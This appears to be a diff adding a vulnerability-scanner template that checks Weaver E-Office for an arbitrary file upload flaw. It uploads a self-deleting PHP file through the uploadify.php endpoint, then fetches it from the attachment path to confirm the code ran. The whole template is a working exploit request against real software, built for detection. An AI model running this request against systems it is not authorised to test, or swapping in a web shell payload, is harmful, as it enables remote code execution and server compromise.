@@ -1,0 +1,47 @@
+id: poc-yaml-weaveroa-E-Office-uploadify-arbitrary-upload
+info:
+  name: Weaveroa E-Office Uploadify Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload, e-office
+variables:
+  fname: '{{rand_base(20)}}'
+http:
+  - raw:
+      - |
+        POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
+
+        --e64bdf16c554bbc109cecef6451c26a4
+        Content-Disposition: form-data; name="Filedata"; filename="{{fname}}.php"
+        Content-Type: image/jpeg
+
+        <?php echo "test-{{fname}}";unlink(__FILE__);?>
+
+        --e64bdf16c554bbc109cecef6451c26a4--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "[0-9]{8,12}"
+    extractors:
+      - type: regex
+        name: fpath
+        internal: true
+        regex:
+          - "([0-9]{8,12})"
+  - path:
+      - /attachment/{{fpath}}/{{fname}}.php
+    method: GET
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "test-{{fname}}"
